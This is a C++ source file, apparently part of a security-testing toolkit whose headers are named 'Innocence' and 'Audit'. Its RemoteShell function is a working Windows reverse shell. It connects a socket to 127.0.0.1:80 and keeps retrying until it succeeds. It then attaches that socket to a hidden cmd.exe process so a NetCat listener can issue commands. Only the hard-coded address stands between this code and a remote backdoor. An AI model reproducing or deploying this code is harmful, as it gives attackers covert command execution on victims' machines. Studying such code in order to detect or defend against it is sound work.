#include <winsock2.h>
#include <log/Log.hpp>
#include <common/ParseOptions.hpp>
#include <common/Innocence.hpp>
#include <audit/Audit.hpp>

void RemoteShell();

int submain(int argc, char ** argv)
{
	try
	{
		LOG.setIdentity(Common::identity);
		Common::ParseOptions(argc, argv);
		RemoteShell();
	}
	CATCH_COMMON_EXCEPTION
	CATCH_UNKNOWN_EXCEPTION
	return EXIT_SUCCESS;
}

INNOCENCE_MAIN

void RemoteShell()
{
    LOG << "RemoteShell : Started";
    SOCKADDR_IN sAddr;
    PROCESS_INFORMATION pi;
    STARTUPINFO si;

    memset( &si, 0, sizeof( si ) );
    si.cb = sizeof( si );
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

    sAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    sAddr.sin_port =  htons(80);
    sAddr.sin_family = AF_INET;

    SOCKET c = WSASocket( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );
	if(c == INVALID_SOCKET)
	{
		LOG << "Unable to acquire socket for RemoteShell";
		return;
	}
    while(connect(c, (LPSOCKADDR)&sAddr, sizeof(sAddr)))
    {
        LOG << "Connection failed";
        Sleep(100);
    }
	LOG << "Connected to NetCat";
    si.hStdInput = (HANDLE)c;
    si.hStdOutput = (HANDLE)c;
    si.hStdError = (HANDLE)c;
    if(!CreateProcess( NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi ))
	{
		LOG << "cmd.exe failed RemoteShell.";
	}
	else
	{
		WaitForSingleObject( pi.hProcess, INFINITE );
		CloseHandle( pi.hProcess );
		CloseHandle( pi.hThread );
	}
    closesocket( c );
    LOG << "RemoteShell : Ended";
}
